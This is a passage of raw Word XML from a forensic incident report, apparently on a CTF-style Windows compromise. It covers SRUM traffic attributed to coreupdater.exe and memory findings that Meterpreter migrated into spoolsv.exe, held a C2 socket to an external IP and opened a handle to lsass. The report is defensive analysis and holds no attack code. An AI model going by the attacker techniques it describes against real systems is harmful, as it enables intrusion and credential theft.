      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:47:09.917465</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>F:\Users\mortysmith\Documents\loot.zip</w:t>
              <w:br/>
              <w:t>FileDelete|Close [Archive] entry=87470-2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#36805</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:46:15.269625</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>F:\Users\mortysmith\Documents\My Social Security Number.zip</w:t>
              <w:br/>
              <w:t>FileCreate [Archive] entry=87445-3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#36753</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:47:38.408830</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, previous)</w:t>
              <w:br/>
              <w:t>NOTEPAD.EXE</w:t>
              <w:br/>
              <w:t>runs=6 hash=C5670914 False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#79</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\prefetch\NOTEPAD.EXE-C5670914.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:47:48.926185</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: BAM/DAM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (BAM)</w:t>
              <w:br/>
              <w:t>\Device\HarddiskVolume3\Windows\System32\notepad.exe</w:t>
              <w:br/>
              <w:t>ROOT\ControlSet001\Services\bam\State\UserSettings\S-1-5-21-2232410529-1445159330-2725690660-500</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_BamDam.csv#42</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-014: SRUM: coreupdater.exe network traffic continues in the 04:14–05:14 slot; PowerShell (ricksanchez) traffic at 05:08 loader</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artifact:srum (application resources)</w:t>
              <w:br/>
              <w:t>artifact:srum (network usage per application)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>command and control</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MITRE ATT&amp;CK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>T1071.001, T1041</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2020-09-19 04:14:00 → 2020-09-19 05:14:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>SRUM NetworkUsages: \device\harddiskvolume3\windows\system32\coreupdater.exe, SID S-1-5-21-2232410529-1445159330-2725690660-500 (Administrator): slot 2020-09-19 04:14:00 BytesReceived 333,817 / BytesSent 222,046; slot 05:14:00 BytesReceived 170,146 / BytesSent 26,570. \windows\system32\windowspowershell\v1.0\powershell.exe SID -1106 (ricksanchez) slot 05:14:00 BytesReceived 178,042 / BytesSent 15,721. SRUM AppResourceUseInfo powershell.exe -1106 slot 05:14 ForegroundCycleTime 2,190,052,069. Memory psscan shows coreupdater.exe PID 8324 exited at 03:43:10 and no other coreupdater instance; PowerShell PID 508 (05:08:37–05:08:43) spawned PID 3316 (05:08:43, still running).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>SRUM records are aggregated per hour and written at the slot timestamp, so the 04:14 slot covers activity ~03:14–04:14 (the 03:40–03:43 Meterpreter session; 222 KB sent may include the loot.zip staging window 03:46–03:47) and the 05:14 slot covers 04:14–05:14. The 05:14 coreupdater entry implies traffic attributed to the coreupdater app identity after 04:14 although the original process had exited at 03:43:10 — possible explanations: the service instance (auto-start) or migrated/injected code whose socket is still accounted to the coreupdater app entry; this cannot be resolved without process telemetry and is examined in the memory step. Sent volume in the first slot (222 KB) is compatible with exfiltration of loot.zip (131 KB) but SRUM cannot prove the content. PowerShell traffic under ricksanchez matches the Run-key loader at 05:08 (F-010).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Evidence (4)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04:14:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (network usage per application)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM: network usage (end of period)</w:t>
              <w:br/>
              <w:t>\device\harddiskvolume3\windows\system32\coreupdater.exe</w:t>
              <w:br/>
              <w:t>received=333817 sent=222046 IF_TYPE_ETHERNET_CSMACD</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>srumecmd/20261025191812_SrumECmd_NetworkUsages_Output.csv#190</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\SRU\SRUDB.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:14:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (network usage per application)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM: network usage (end of period)</w:t>
              <w:br/>
              <w:t>\device\harddiskvolume3\windows\system32\coreupdater.exe</w:t>
              <w:br/>
              <w:t>received=170146 sent=26570 IF_TYPE_ETHERNET_CSMACD</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>srumecmd/20261025191812_SrumECmd_NetworkUsages_Output.csv#193</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\SRU\SRUDB.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:14:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (network usage per application)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM: network usage (end of period)</w:t>
              <w:br/>
              <w:t>\device\harddiskvolume3\windows\system32\windowspowershell\v1.0\powershell.exe</w:t>
              <w:br/>
              <w:t>received=178042 sent=15721 IF_TYPE_ETHERNET_CSMACD</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>srumecmd/20261025191812_SrumECmd_NetworkUsages_Output.csv#206</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\SRU\SRUDB.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:14:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (application resources)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM: resource usage (end of period)</w:t>
              <w:br/>
              <w:t>\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</w:t>
              <w:br/>
              <w:t>foreground read/written=1085952/40960 background read/written=0/0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>srumecmd/20261025191812_SrumECmd_AppResourceUseInfo_Output.csv#761</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\SRU\SRUDB.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.4 Memory (RAM)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>(call limit reached)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-015: Memory: Meterpreter migrated into spoolsv.exe (PID 2188, SYSTEM) — MZ RWX region, inherited C2 socket to 203.78.103.109:443, handle to lsass.exe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artifact:srum (network usage per application)</w:t>
              <w:br/>
              <w:t>memory</w:t>
              <w:br/>
              <w:t>network</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MITRE ATT&amp;CK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>T1055.001, T1620, T1071.001, T1003.001, T1134</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2020-09-19 02:40:49.936293 → 2020-09-19 05:14:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Memory image DESKTOP-SDN1RPT.mem (2 GiB, SHA256 AC6EE0E8C273103B94D776F54192D2C6ACF8303AABBD6A199254030C69F667C3), Win10 19041 x64, SystemTime 2020-09-19 05:10:39 UTC (≈40 s after FTK Imager started at 05:09:56).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- vol_malfind: spoolsv.exe PID 2188 (PPID 616 services.exe, created 01:24:09, Spooler service SERVICE_RUNNING) has a private VadS region at 0x1840000 marked PAGE_EXECUTE_READWRITE, CommitCharge 36, starting with an 'MZ' header (4d 5a 90 00 ...): a reflectively loaded PE in a system service.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- vol_handles PID 2188: Process handle to lsass.exe PID 656 (GrantedAccess 5136 = 0x1410, PROCESS_QUERY_INFORMATION|PROCESS_VM_READ), a File handle to directory \Device\HarddiskVolume3\Users\mortysmith\Desktop (row 14195), and several \Device\Afd\Endpoint socket handles.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- vol_privileges PID 2188: SeTcbPrivilege, SeAssignPrimaryTokenPrivilege, SeImpersonatePrivilege enabled; getsids: S-1-5-18 Local System.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- vol_netscan/netstat: TCP 10.42.85.115:50875 -&gt; 203.78.103.109:443 ESTABLISHED (owner not resolved). Suricata flow row 29788: same 5-tuple, flow_start 2020-09-19T04:40:49+0200 (= 02:40:49 pcap clock = 03:40:49 host UTC after the known −1 h pcap offset), still established at 07:38:44+0200, 280 KB up / 1.76 MB down.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- coreupdater.exe PID 8324 (PPID 4008, session 3) created 03:40:49 and exited 03:43:10 (pslist/psscan), yet its socket 50875 stays open until capture; SRUM still attributes 333,817/222,046 bytes (04:14 slot) and 170,146/26,570 bytes (05:14 slot) to coreupdater.exe (SID -500).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- vol_svclist: service 'coreupdater' is SERVICE_STOPPED (AUTO_START, never started since boot 01:24).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Thoughts.txt on mortysmith's Desktop: $MFT LastAccess 2020-09-19 03:48:30 and the file is also in vol_filescan (row 5309).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Facts from memory (one source), the pcap (a second one) and SRUM on disk (a third) agree. The C2 session that coreupdater.exe opened at 03:40:49 outlived the process, which exited at 03:43:10, and was still live when memory was captured. SYSTEM process spoolsv.exe holds an RWX region with an MZ header and socket endpoints. Taken together, this fits Meterpreter's 'migrate' into spoolsv.exe at about 03:43, just before getsystem 'nehgye' at 03:43:14. This is a classic Metasploit target. SRUM attributing the later traffic to coreupdater.exe also fits an inherited socket. The memory output does not resolve which process owns socket 50875, so the link to spoolsv rests on the MZ RWX region, the AFD handles and the timing. That makes the attribution to spoolsv probable to strong, not proven. The handle to lsass with VM_READ rights points to credential access (e.g. hashdump/kiwi), but no disk artifact confirms a dump. The handle to mortysmith\Desktop (the process's current directory or an open file) and the access to Thoughts.txt at 03:48:30 point to file browsing from this session. As a result, the attacker still had SYSTEM-level access through an in-memory implant when the system was acquired, with no backing file on disk.</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raw.vol_malfind</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>{"TreeDepth": "0", "CommitCharge": "36", "Disasm": "\"\n0x1840000:\tpop\tr10\n0x1840002:\tnop\t\n0x1840003:\tadd\tbyte ptr [rbx], al\n0x1840005:\tadd\tbyte ptr [rax], al\n0x1840007:\tadd\tbyte ptr [rax + rax], al\n0x184000a:\tadd\tbyte ptr [rax], al\"", "End VPN": "25575423", "File output": "Disabled", "Hexdump": "4d 5a 90 00 03 00 00 00 04 00 00 0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.malware.malfind.Malfind.jsonl#1</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"5136", "HandleValue": "1964", "Name": "lsass.exe Pid 656", "Offset": "209519057219712", "PID": "2188", "Process": "spoolsv.exe", "Type": "Process"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.handles.Handles.jsonl#14206</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>raw.vol_handles</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>{"TreeDepth": "0", "GrantedAccess": "1048608", "HandleValue": "1912", "Name": "\\Device\\HarddiskVolume3\\Users\\mortysmith\\Desktop", "Offset": "209519093754240", "PID": "2188", "Process": "spoolsv.exe", "Type": "File"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.handles.Handles.jsonl#14195</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>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volatility/windows.netstat.NetStat.jsonl#12</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
